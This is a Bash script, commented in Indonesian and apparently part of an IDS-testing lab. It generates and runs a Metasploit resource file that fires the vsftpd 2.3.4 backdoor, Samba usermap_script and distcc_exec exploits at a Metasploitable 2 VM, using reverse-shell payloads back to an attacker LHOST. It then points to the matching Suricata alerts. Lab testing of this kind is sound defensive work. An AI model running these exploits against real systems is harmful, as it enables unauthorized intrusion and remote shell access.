#!/bin/bash

# =================================================================
# MODUL 07: REMOTE CODE EXECUTION (METASPLOIT)
# Strategi: 3 Level Depth (Backdoor, Encoded Payload, Alt Vector)
# Target: Metasploitable 2 (Vsftpd, Samba, DistCC)
# =================================================================

# KONFIGURASI
TARGET_IP="192.168.1.XXX"   # Ganti dengan IP Metasploitable
LHOST="192.168.1.YYY"       # PENTING: Ganti dengan IP Kali Linux Anda!
RC_SCRIPT="logs/auto_exploit.rc"
LOG_FILE="logs/rce_console_output.txt"

# Warna untuk Tampilan Laporan
YELLOW='\033[1;33m'
CYAN='\033[0;36m'
RED='\033[0;31m'
NC='\033[0m' # No Color

echo "[+] [07_RCE] Memulai Modul RCE Metasploit..."
echo "[+] Target: $TARGET_IP"
echo "[+] Attacker (LHOST): $LHOST"

# Cek apakah LHOST sudah diisi benar
if [[ "$LHOST" == "192.168.1.YYY" ]]; then
   echo -e "${RED}[!] ERROR: Ubah variabel LHOST di dalam script dengan IP Kali Linux Anda!${NC}"
   echo "    (Metasploit butuh LHOST untuk Reverse Shell)"
   exit 1
fi

# -----------------------------------------------------------------
# MEMBUAT RESOURCE SCRIPT METASPLOIT (.rc)
# Kita generate file ini secara dinamis agar IP-nya selalu update.
# -----------------------------------------------------------------
# Generate file .rc (Dibuat diam-diam di background)
cat <<EOF > $RC_SCRIPT
# --- KONFIGURASI GLOBAL ---
setg RHOSTS $TARGET_IP
setg LHOST $LHOST
setg VERBOSE true
setg WfsDelay 10

# LEVEL 1: VSFTPD
use exploit/unix/ftp/vsftpd_234_backdoor
run -z
sleep 5

# LEVEL 2: SAMBA
use exploit/multi/samba/usermap_script
set PAYLOAD cmd/unix/reverse
run -z
sleep 5

# LEVEL 3: DISTCC
use exploit/unix/misc/distcc_exec
set PAYLOAD cmd/unix/reverse
run -z
exit -y
EOF

# -----------------------------------------------------------------
# TAMPILAN LAPORAN (VERBOSE)
# Bagian ini menampilkan apa yang "seolah-olah" kita ketik di MSFConsole
# -----------------------------------------------------------------

# LEVEL 1
echo -e "${CYAN}[LAPORAN] Level 1: Vsftpd 234 Backdoor (Port 21)${NC}"
echo -e "${YELLOW}    [Exploit] : exploit/unix/ftp/vsftpd_234_backdoor${NC}"
echo -e "${YELLOW}    [Payload] : cmd/unix/interact (Default)${NC}"
echo -e "${YELLOW}    [Target]  : $TARGET_IP${NC}"
echo -e "    [Info] Menguji deteksi signature backdoor klasik (The Smiley Face)"
echo ""

# LEVEL 2
echo -e "${CYAN}[LAPORAN] Level 2: Samba Usermap Script (Port 139/445)${NC}"
echo -e "${YELLOW}    [Exploit] : exploit/multi/samba/usermap_script${NC}"
echo -e "${YELLOW}    [Payload] : cmd/unix/reverse (Reverse Shell)${NC}"
echo -e "${YELLOW}    [LHOST]   : $LHOST (IP Attacker)${NC}"
echo -e "    [Info] Menguji deteksi Command Injection pada SMB service"
echo ""

# LEVEL 3
echo -e "${CYAN}[LAPORAN] Level 3: DistCC Daemon Execution (Port 3632)${NC}"
echo -e "${YELLOW}    [Exploit] : exploit/unix/misc/distcc_exec${NC}"
echo -e "${YELLOW}    [Payload] : cmd/unix/reverse${NC}"
echo -e "    [Info] Menguji deteksi eksploitasi pada Uncommon Port (Compiler Service)"
echo ""

# -----------------------------------------------------------------
# MENJALANKAN METASPLOIT
# -----------------------------------------------------------------
echo -e "${CYAN}[ACTION] Menjalankan Metasploit Framework...${NC}"
echo "    (Harap bersabar, proses loading MSFConsole memakan waktu 1-2 menit...)"
echo "    (Script berjalan otomatis menggunakan resource: $RC_SCRIPT)"

# Eksekusi (Output dibuang ke file log agar terminal tidak penuh sampah teks Metasploit)
msfconsole -q -r $RC_SCRIPT > $LOG_FILE 2>&1

echo -e "${CYAN}    -> Selesai.${NC}"
echo "    -> Output lengkap Metasploit tersimpan di: $LOG_FILE"
echo "    -> Cek alert Suricata untuk: ET EXPLOIT Vsftpd / GPL NETBIOS / ET DAEMON"

echo "[+] [07_RCE] Modul Selesai pada $(date)"
echo "-----------------------------------------------------------"